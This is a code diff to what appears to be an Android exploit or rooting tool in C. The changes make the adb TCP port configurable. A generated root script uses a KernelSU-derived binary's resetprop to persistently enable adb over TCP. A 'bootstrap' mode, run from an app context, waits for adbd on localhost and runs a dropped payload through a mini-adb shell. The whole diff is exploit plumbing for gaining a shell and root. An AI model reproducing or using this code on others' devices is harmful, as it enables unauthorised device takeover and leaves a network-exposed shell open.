@@ -315,8 +315,9 @@ static void write_root_script(void) {
     "RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
     "if [ -n \"$RSPROP\" ]; then\n"
     "  chmod 755 \"$RSPROP\" 2>/dev/null\n"
-    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port 5555 2>&1 && echo '[+] persist.adb.tcp.port=5555 set via resetprop'\n"
-    "  \"$RSPROP\" resetprop service.adb.tcp.port 5555 2>/dev/null\n"
+    "  ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
+    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
+    "  \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
     "fi\n"
     "rm -f /data/local/tmp/.ghostlock_w1\n"
     "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
@@ -546,6 +547,7 @@ int run_exploit(int argc, char **argv) {
 int install_embedded_wallpaper(void) { return 0; }
 
 static int run_write1_only(void);
+extern int mini_adb_port;
 extern int mini_adb_shell(const char *cmd);
 
 /* --bootstrap mode: runs from app context (any UID, with seccomp).
@@ -560,28 +562,34 @@ static int run_bootstrap(void) {
   int ret = run_write1_only();
   if (ret != 0) return ret;
 
-  /* Wait for adb TCP on port 5555 */
-  pr_info("Waiting for adb TCP on port 5555...\n");
+  /* Wait for adb TCP — read the actual port from system property */
+  int adb_port = 5555;
+  char port_buf[32] = {};
+  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
+  if (port_buf[0]) adb_port = atoi(port_buf);
+  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
+  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
   for (int i = 0; i < 30; i++) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in addr = {
       .sin_family = AF_INET,
-      .sin_port = htons(5555),
+      .sin_port = htons(adb_port),
       .sin_addr.s_addr = htonl(0x7f000001)
     };
     int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
     if (sock >= 0) close(sock);
     if (c == 0) {
-      pr_success("adbd ready on port 5555 (attempt %d)\n", i + 1);
+      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
       goto tcp_ready;
     }
     usleep(1000000);
   }
-  pr_error("adbd not on TCP 5555 after 30s\n");
+  pr_error("adbd not on TCP %d after 30s\n", adb_port);
   return 1;
 tcp_ready:
   usleep(200000);
-  pr_info("Connecting via mini-adb...\n");
+  mini_adb_port = adb_port;
+  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
   int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
   pr_info("mini-adb returned %d\n", adb_ret);
 
